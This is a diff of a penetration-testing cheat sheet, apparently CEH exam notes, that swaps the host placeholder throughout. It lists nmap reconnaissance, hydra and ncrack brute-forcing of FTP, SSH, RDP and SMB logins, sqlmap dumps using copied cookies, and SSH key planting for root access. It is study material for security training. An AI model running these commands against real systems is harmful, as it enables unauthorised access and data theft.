@@ -8,57 +8,57 @@
 ip a | ifconfig
 
 **Scanning network Live Host (ping sweep)**  
-nmap -sP <host>/CIDR
+nmap -sP [host]/CIDR
 
 **Scanning Live Host without port scan in same subnet (ARP Scan)** <br>
-nmap -PR -sn <host>/CIDR
+nmap -PR -sn [host]/CIDR
 
 **Scripts + Version running on taget machine**<br>
-nmap -sC -sV <host>/CIDR
+nmap -sC -sV [host]/CIDR
 
 **OS of the target machine**<br>
-nmap -O <host>
+nmap -O [host]
 
 **All open ports of the target**      
-nmap -p- <host>/CIDR
+nmap -p- [host]/CIDR
 
 **Specific port scan of the target**   
-nmap -p (port number) <host>/CIDR
+nmap -p (port number) [host]/CIDR
 
 **Aggressive scan**                            
-nmap -A <host>/CIDR
+nmap -A [host]/CIDR
 
 **Scanning using NSE scripts** <br>
-nmap --scripts (script name) -p (port number) <host>/CIDR |  https://nmap.org/book/man-nse.html
-nmap --script smb-os-discovery.nse <host> (Displays OS, Computer-Name, Domain, WorkGroup and Ports.)
+nmap --scripts (script name) -p (port number) [host]/CIDR |  https://nmap.org/book/man-nse.html
+nmap --script smb-os-discovery.nse [host] (Displays OS, Computer-Name, Domain, WorkGroup and Ports.)
 
 **Scripts + Version + Ports + OS Scan (overall)**<br>
-nmap -sC -sV -p- -A -v -T4 <host>/CIDR
+nmap -sC -sV -p- -A -v -T4 [host]/CIDR
 
 **Host discovery**    
-netdiscover -i eth0 | netdiscover -r <host>/CIDR
+netdiscover -i eth0 | netdiscover -r [host]/CIDR
 
 **Live machines**<br>
-sudo fping -a -g <host>/CIDR 2>/dev/null<br>
-sudo nmap -sn <host>/CIDR
+sudo fping -a -g [host]/CIDR 2>/dev/null<br>
+sudo nmap -sn [host]/CIDR
 
 **Domain Controler**<br>
-sudo nmap -p 389,445 --open -oG - <host>/CIDR | grep open
+sudo nmap -p 389,445 --open -oG - [host]/CIDR | grep open
 	
 ### WEB & SERVICES
 nikto -h www.host.com
 
 **Banner Grabbing**<br>
 Use ID Serv from windows<br>
-whatweb <host> <br>
+whatweb [host] <br>
 zaproxy for web crawling <br>
-nmap -A <host> and look at http-server-header for load balancing<br>
-telnet <host> <port><br>
-nc -v <host> <port><br>
-nmap -sV <host><br>
-echo -e "HEAD / HTTP/1.1\r\nHost: <host>\r\nConnection: close\r\n\r\n" | nc <host> 80<br>
-curl -I http://<host> <br>
-openssl s_client -connect <host>:<port><br>
+nmap -A [host] and look at http-server-header for load balancing<br>
+telnet [host] [port]<br>
+nc -v [host] [port]<br>
+nmap -sV [host]<br>
+echo -e "HEAD / HTTP/1.1\r\nHost: [host]\r\nConnection: close\r\n\r\n" | nc [host] 80<br>
+curl -I http://[host] <br>
+openssl s_client -connect [host]:[port]<br>
 
 **Geolocation**<br>
 dig +short certifiedhacker.com | 162.241.216.11<br>
@@ -69,10 +69,10 @@ dig ns certifiedhacker.com | ns2.bluehost.com<br>
 dig axfr certifiedhacker.com @ns2.bluehost.com
 
 **FQDN**<br>
-nmap -sC -sV <host><br>
+nmap -sC -sV [host]<br>
 Look for DNS Computer Name<br>
 Find FQDN<br>
-nmap -p389 –sV -iL <host>  or nmap -p389 –sV <host> (Find the FQDN in a subnet/network)<br>
+nmap -p389 –sV -iL [host]  or nmap -p389 –sV [host] (Find the FQDN in a subnet/network)<br>
 
 ## 2. SERVICE ENUMERATION
 
@@ -80,11 +80,11 @@ nmap -p389 –sV -iL <host>  or nmap -p389 –sV <host> (Find the FQDN in a subn
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
 
 **Brute force FTP**                         
-hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt <host> ftp <br>
-hydra -l administrator -P /usr/share/wordlist/passwords.txt <host> ftp <br>
-ncrack -U usernames.txt -P passwords.txt ftp://<host><br>
-ncrack -U usernames.txt -P passwords.txt <host>:21 -v <br>
-medusa -h <host> -U usernames.txt -P passwords.txt -M ftp <br>
+hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt [host] ftp <br>
+hydra -l administrator -P /usr/share/wordlist/passwords.txt [host] ftp <br>
+ncrack -U usernames.txt -P passwords.txt ftp://[host]<br>
+ncrack -U usernames.txt -P passwords.txt [host]:21 -v <br>
+medusa -h [host] -U usernames.txt -P passwords.txt -M ftp <br>
 msf> auxiliary(scanner/ftp/ftp_login)><br>
 set RHOSTS <target IP><br>
 set user_file /path/usernames.txt<br>
@@ -97,7 +97,7 @@ ls then get secret.txt
 https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
 
 **Brute force username** 
-hydra -l root -P passwords.txt [-t 32] <host> ssh
+hydra -l root -P passwords.txt [-t 32] [host] ssh
 msf> use scanner/ssh/ssh_enumusers |
 
 **Private key brute force**    
@@ -107,41 +107,41 @@ msf> use scanner/ssh/ssh_identify_pubkeys |
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet | https://www.hackingarticles.in/penetration-testing-telnet-port-23/ | https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#telnet
 
 **Enumerate Telnet** 
-nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <host>
+nmap -n -sV -Pn --script "*telnet* and safe" -p 23 [host]
 **Brute force Telnet credentials** 
-hydra -l root -P passwords.txt [-t 32] <host> telnet 
+hydra -l root -P passwords.txt [-t 32] [host] telnet 
 
 ### SMTP PORT 25
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
 
 **Initiate a TCP connection to port 25**
-telnet <host>
+telnet [host]
 
 **Finding MX servers of an organisation**    
 dig +short mx google.com
 
 **Enumeration**  
-nmap -p25 --script smtp-commands <host>
-nmap -p25 --script smtp-open-relay <host> -v
+nmap -p25 --script smtp-commands [host]
+nmap -p25 --script smtp-open-relay [host] -v
 
 ### DNS PORT 53
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
 
 **Enumarate DNS**  
-dnsrecon -w -d <host> |  dnsrecon -d <host> -z
+dnsrecon -w -d [host] |  dnsrecon -d [host] -z
 dig NS certifiedhacker.com
 
 **Brute forcing**  
-nmap --script dns-brute <host>
+nmap --script dns-brute [host]
 
 ### NetBIOS PORT 137/138/139   
 https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios
 
 **Enumerate NetBIOS** 
-nmap -sV -v <host> | sudo nmap -sU --script nbstat.nse -p137 <host> | enum4linux -u martin -p apple -n <host> (all info) | enum4linux -u martin -p apple -P <host> (policy info)
+nmap -sV -v [host] | sudo nmap -sU --script nbstat.nse -p137 [host] | enum4linux -u martin -p apple -n [host] (all info) | enum4linux -u martin -p apple -P [host] (policy info)
 
 **Enumerate NetBIOS from cmd**   
-nbtstat -a <host> (-c list contents of Netbios name cache)
+nbtstat -a [host] (-c list contents of Netbios name cache)
 
 **Enumerate Domain Users**	
 net use (Displays connection status, Shared folder/drive and Network Information) | net user | net user /domain | net user [username] | net user [username] /domain
@@ -150,61 +150,61 @@ net use (Displays connection status, Shared folder/drive and Network Information
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
 
 **Enumarate SNMP**     
-nmap -sU <host> | nmap -sU -p 161 --script=snmp-interfaces <host>
+nmap -sU [host] | nmap -sU -p 161 --script=snmp-interfaces [host]
 
 **Identify the processes running on the target machine**
-snmp-check <host> (it will show user accounts, processes etc)
+snmp-check [host] (it will show user accounts, processes etc)
 Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> snmp
-nmap -sU -p 161 --script=snmp-processes <host>
+nmap -sU -p 161 --script=snmp-processes [host]
 
 **List valid comunity strings of the server** 
 msfconsole
 search snmp
 use auxiliary/scanner/snmp/snmp_login
 show options
-set RHOST <host>
+set RHOST [host]
 exploit
 
 ### LDAP PORT 389,636,3268,3269
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
 
 **Enumerate Users**
-enum4linux -U -o <host>
+enum4linux -U -o [host]
 
 ### SMB PORT 445
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
 
 **Enumarate Network File Shares**      
 Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> smb
-nmap --script smb-enum-shares.nse -p445 <host>
-sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>
-smbclient -L \\<host>
+nmap --script smb-enum-shares.nse -p445 [host]
+sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 [host]
+smbclient -L \\[host]
 
 **Logged in Users details**    
 nmap --script smb-enum-users.nse -p445 IP
-sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
+sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]
 
 **Workgroups**    
-nmap --script smb-enum-users.nse -p445 <host>
-sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
+nmap --script smb-enum-users.nse -p445 [host]
+sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]
 
 **Secutiry level information** 
-nmap -sC -sV -A -T4 -p 445 <host>
+nmap -sC -sV -A -T4 -p 445 [host]
 
 **Domains & Services**  
-nmap --script smb-enum-services.nse -p445 <host>
-nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 <host> |
+nmap --script smb-enum-services.nse -p445 [host]
+nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 [host] |
 
 **Brute force SMB**     
-hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt (optional -vV) <host> smb
-nmap --script smb-brute -p 445 <host> |
+hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt (optional -vV) [host] smb
+nmap --script smb-brute -p 445 [host] |
 
 **Connect to SMB** 
-smbclient //<host>/<share_name) -W <domain_name> -U <Username%password> |
+smbclient //[host]/<share_name) -W <domain_name> -U <Username%password> |
 
 **Mount SMB share to kali**
-sudo mount -t cifs //<host>/<share_name> /<local path> -o username=<username>,password=<password>
-nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 <host> |
+sudo mount -t cifs //[host]/<share_name> /<local path> -o username=<username>,password=<password>
+nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 [host] |
 
 ### RDP PORT 3389
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
@@ -214,15 +214,15 @@ msfconsole -q
 search rdp
 use auxiliary/scanner/rdp/rdp_scanner
 show options
-set RHOST <host>
+set RHOST [host]
 set RPORT 3333 (if there is no port 3389 on the target)
 exploit
 
 **Use hydra to brute force the login credentials**  
-hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://<host> -s 3389
+hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://[host] -s 3389
 
 **Use RDP tools to connect to machine**     
-xfreerdp /u:<username> /p:<password> /v:<host>:3389
+xfreerdp /u:<username> /p:<password> /v:[host]:3389
 
 ### HTTP/HTTPS PORT 80/443/8080/8081
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
@@ -247,9 +247,9 @@ node puff.js -w ./wordlist-examples/xss.txt -u "http://www.xssgame.com/f/m4KKGHi
 
 ### Port Login
 
-**FTP Login** 			| ftp <host>
-**SSH Logi**n			| ssh username@<host>
-**TELNET Login**		| telnet <host>
+**FTP Login** 			| ftp [host]
+**SSH Logi**n			| ssh username@[host]
+**TELNET Login**		| telnet [host]
 
 ## 3. System Hacking
 https://nvd.nist.gov/vuln/search
@@ -409,23 +409,23 @@ john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash
 ### hydra
 
 **FTP**: 
-hydra -l user -P passlist.txt ftp://<host>
-hydra -L userlist.txt -P passlist.txt ftp://<host>
+hydra -l user -P passlist.txt ftp://[host]
+hydra -L userlist.txt -P passlist.txt ftp://[host]
     
 **SSH**: 
-hydra -l <username> -P <full path to pass> <host> -t 4 ssh
+hydra -l <username> -P <full path to pass> [host] -t 4 ssh
 
 Post Web Form: 
-hydra -l <username> -P <wordlist> <host> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -l <username> -P <wordlist> [host] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
-- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://<host>`
-- `hydra -l root -P passwords.txt [-t 32] <host> ftp
-- `hydra -L usernames.txt -P pass.txt <host> mysql
-- `hydra -l USERNAME -P /path/to/passwords.txt -f <host> pop3 -V`
-- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<host>`
+- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[host]`
+- `hydra -l root -P passwords.txt [-t 32] [host] ftp
+- `hydra -L usernames.txt -P pass.txt [host] mysql
+- `hydra -l USERNAME -P /path/to/passwords.txt -f [host] pop3 -V`
+- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://[host]`
 - `hydra -P common-snmp-community-strings.txt target.com snmp
-- `hydra -l Administrator -P words.txt <host> smb t 1
-- `hydra -l root -P passwords.txt <host> ssh
+- `hydra -l Administrator -P words.txt [host] smb t 1
+- `hydra -l root -P passwords.txt [host] ssh
 
 ### wpscan
 
@@ -440,17 +440,17 @@ wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
 
 
 **Directory Bruteforcing**
-gobuster dir -u <host> -w /home/attacker/Desktop/common.txt
+gobuster dir -u [host] -w /home/attacker/Desktop/common.txt
 
 **Enumerate a Web Application using WPscan & Metasploit**
-wpscan --url http://<host>:<port>/NEW --enumerate u  (u means username) 
+wpscan --url http://[host]:[port]/NEW --enumerate u  (u means username) 
 Then type msfconsole to open metasploit. 
 Type -  use auxilliary/scanner/http/wordpress_login_enum
  						 show options
 						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
-						 set RHOSTS <host>  (target ip)
+						 set RHOSTS [host]  (target ip)
 						 set RPORT <pot>    (target port)
-						 set TARGETURI http://<host>:<pot>/
+						 set TARGETURI http://[host]:<pot>/
 						 set USERNAME admin
 
 **Find if application is vulnerable to XSStrike**
@@ -504,30 +504,30 @@ As of optional settings it supports HTTP proxy together with HTTP header values 
 python3 dsss.py -u "url" --cookie="cookie"
 
 ### sqlmap
-Open the vulnerable website - <host> (exmpl: http://movies.cehorg.com/viewprofile.aspx?id=1)
+Open the vulnerable website - [host] (exmpl: http://movies.cehorg.com/viewprofile.aspx?id=1)
 Copy the cookie from the inspect element -> Console -> type document.cookie and copy the result - <cookie> (exmpl: mscope=Xf4nda2RM2w=; ui-tabs-1=0)
 Open the terminal to use sqlmap 
 
 **List databases, add cookie values**
-sqlmap -u "<host>" --cookie=”<cookie>” --dbs 
+sqlmap -u "[host]" --cookie=”<cookie>” --dbs 
 OR
-sqlmap -u "<host>" --cookie=”<cookie>; security=low”   --data="id=1&Submit=Submit" --dbs  
+sqlmap -u "[host]" --cookie=”<cookie>; security=low”   --data="id=1&Submit=Submit" --dbs  
 
 **List Tables, add databse name**
-sqlmap -u “<host>” --cookie="<cookie>" -D <DataBase> --tables
+sqlmap -u “[host]” --cookie="<cookie>" -D <DataBase> --tables
 OR
-sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> --tables  
+sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> --tables  
 
 **List Columns of that table**
-sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --columns
+sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --columns
 
 **Dump all values of the table**
-sqlmap -u “<host>” --cookie="<cookie>" -D <DataBase> -T <Table> --dump
+sqlmap -u “[host]” --cookie="<cookie>" -D <DataBase> -T <Table> --dump
 OR
-sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --dump
+sqlmap -u "[host]" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --dump
 
 **MySQL**
-mysql -U qdpmadmin -h <host> -P passwod 
+mysql -U qdpmadmin -h [host] -P passwod 
 show databases;
 use qdpm;
 show tables'
@@ -604,7 +604,7 @@ ADB - for connecting Android devices to PC and binary analysis
 Burpsuite - for analysing and manipulating the traffic
 
 ## 10. Privilege Escalation Basics
-ssh <user_name>@<IP> -p <port>
+ssh <user_name>@<IP> -p [port]
 
 to check privileges
 sudo -l
@@ -622,12 +622,12 @@ paste the key
 ctrlS ctrlX
 chmod 600 id_rsa
 
-ssh root@<IP> -p <port> -i id_rsa
+ssh root@<IP> -p [port] -i id_rsa
 *******************************
 ssh-keygen -t rsa
 cat ~/.ssh/id_rsa.pub | ssh USER@HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
 
-ssh <user_name>@<IP> -p <port> -i id_rsa
+ssh <user_name>@<IP> -p [port] -i id_rsa
 *******************************
 - 1st_file we have permission
 - 2nd file we do not have permission
